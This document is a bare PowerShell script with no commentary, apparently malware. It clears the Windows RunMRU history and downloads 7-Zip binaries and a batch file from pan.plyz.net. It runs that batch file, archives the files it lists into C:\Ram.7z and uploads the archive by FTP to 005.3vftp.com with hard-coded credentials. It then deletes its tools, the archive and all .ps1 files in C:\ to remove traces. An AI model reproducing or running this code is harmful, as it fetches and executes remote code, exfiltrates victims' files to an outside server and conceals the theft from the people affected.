reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f;
(New-Object System.Net.WebClient).DownloadFile('http://pan.plyz.net/d.asp?u=1948862583&p=7z.dll','c:\7z.dll');
(New-Object System.Net.WebClient).DownloadFile('http://pan.plyz.net/d.asp?u=1948862583&p=7z.exe','c:\7z.exe');
(New-Object System.Net.WebClient).DownloadFile('http://pan.plyz.net/d.asp?u=1948862583&p=get.bat','c:\Users\Public\get.bat');
C:\Users\Public\get.bat;$array="";foreach($u in(get-content c:\temp.bat)){[array]$array +='c:\7z a -t7z c:\Ram.7z "'+$u+'"'};$array | Out-File -Encoding default c:\temp.bat;c:\temp.bat;
$fileinf=New-Object System.Io.FileInfo("C:\Ram.7z");
$ftp = [System.Net.FtpWebRequest] [System.Net.FtpWebRequest]::Create("ftp://005.3vftp.com/"+$fileinf.name)
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = new-object System.Net.NetworkCredential("badtest01","badtest")
$ftp.UseBinary = $true
$ftp.UsePassive = $true
$content = [System.IO.File]::ReadAllBytes($fileInf.fullname)
$ftp.ContentLength = $content.Length
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
$rs.Close()
$rs.Dispose()
Remove-Item c:\temp.bat
Remove-Item c:\Ram.*
Remove-Item c:\7z.*
Remove-Item c:\Users\Public\get.*
Remove-Item c:\*.ps1